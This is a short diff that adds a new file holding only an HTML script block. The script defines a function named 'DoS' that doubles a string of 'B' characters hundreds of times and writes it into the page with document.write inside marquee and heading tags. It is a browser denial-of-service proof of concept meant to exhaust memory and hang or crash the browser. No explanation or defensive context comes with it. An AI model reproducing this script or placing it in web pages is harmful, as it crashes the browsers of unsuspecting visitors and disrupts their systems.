@@ -1,0 +1,13 @@
+<script>
+  
+function DoS() {
+  
+var buffer = '\x42';
+for (i =0;i<666;i++) {
+buffer+=buffer+'\x42';
+document.write('<html><marquee><h1>'+buffer+buffer);
+}
+  
+}
+  
+</script>
